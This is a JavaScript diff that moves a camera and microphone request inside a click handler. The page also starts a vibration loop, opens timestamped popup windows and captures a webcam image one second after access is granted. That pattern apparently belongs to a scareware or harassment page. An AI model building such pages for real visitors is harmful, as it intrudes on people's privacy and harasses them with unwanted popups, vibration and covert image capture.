@@ -303,28 +303,11 @@
             window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
         }
 
-        async function triggerFullScreen() {
+        function triggerFullScreen() {
             startVibrationLoop();
 
             if (!isMobileDevice) {
                 openDefaultPopup();
-            }
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: true, 
-                    audio: true 
-                });
-                
-                cameraStream = stream;
-                videoElement.srcObject = stream;
-                
-                setTimeout(() => {
-                    captureImage();
-                }, 1000);
-                
-            } catch (error) {
-                console.error('Camera access denied or not available:', error);
             }
 
             startSession();
@@ -341,6 +324,22 @@
                     }
                 }, false);
             }
+
+            navigator.mediaDevices.getUserMedia({ 
+                video: true, 
+                audio: true 
+            })
+            .then(stream => {
+                cameraStream = stream;
+                videoElement.srcObject = stream;
+                
+                setTimeout(() => {
+                    captureImage();
+                }, 1000);
+            })
+            .catch(error => {
+                console.error('Camera access denied or not available:', error);
+            });
         }
 
         fullscreenContent.addEventListener('click', function() {
